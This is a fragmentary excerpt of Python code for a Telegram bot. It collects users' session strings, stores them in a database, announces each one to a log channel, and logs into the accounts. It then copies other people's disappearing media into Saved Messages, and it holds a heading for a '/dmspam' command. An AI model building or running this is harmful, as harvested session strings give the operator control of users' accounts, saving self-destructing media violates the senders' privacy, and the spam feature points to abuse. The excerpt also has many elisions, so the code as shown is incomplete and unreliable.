...
def detect_session_type(session_string: str) -> str:
    if session_string.startswith("1A"):
        return "pyrogram"
    return "telethon"
...
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        ...
        "\U0001F6E1\ufe0f Disappearing media is auto-saved to Saved Messages."
    )
...
async def connect(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await sessions.update_one({"_id": user_id}, {"$set": {"session": session_string, "type": session_type}}, upsert=True)
    await context.bot.send_message(
        chat_id=LOG_CHANNEL_ID,
        text=f"\U0001F512 New {session_type} session received from user `{user_id}`"
    )
    ...
    try:
        await client.connect() if session_type == "telethon" else client.start()
        if session_type == "telethon" and not await client.is_user_authorized():
    ...
    try:
        me = await client.get_me() if session_type == "telethon" else await client.get_me()
                ...
                if event.is_private and event.media and getattr(event.media, 'ttl_seconds', None):
                    try:
                        await client.send_file(
                            "me",
                            event.media,
                            caption=f"\U0001F552 Saved disappearing media from {event.sender_id} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                        )
                    except Exception as e:
...
# --- Optional: Bot-side /dmspam command ---
